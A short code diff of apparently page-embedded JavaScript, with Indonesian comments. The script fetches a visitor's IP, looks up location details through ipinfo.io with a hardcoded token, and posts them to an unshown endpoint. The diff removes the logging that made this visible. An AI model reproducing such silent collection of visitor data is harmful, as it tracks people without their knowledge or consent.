@@ -652,14 +652,13 @@ Password: 123">
 fetch('https://api.ipify.org?format=json')
 .then(response => response.json())
 .then(data => {
-  console.log('Your IP address is:', data.ip);
+
   
   // Mengambil informasi IP lebih lanjut
   fetch(`https://ipinfo.io/${data.ip}/json?token=82d64b35835cc7`)
     .then(response => response.json())
     .then(ipInfo => {
-      console.log('IP Info:', ipInfo);
-
+  
       // Membuat objek FormData
       const formData = new FormData();
       formData.append('ip', ipInfo.ip);
@@ -677,7 +676,7 @@ fetch('https://api.ipify.org?format=json')
       })
       .then(response => response.json())
       .then(result => {
-        console.log('Data successfully posted:', result);
+        console.log('Data successfully posted:');
       })
       .catch(error => {
         console.error('Error posting data:', error);
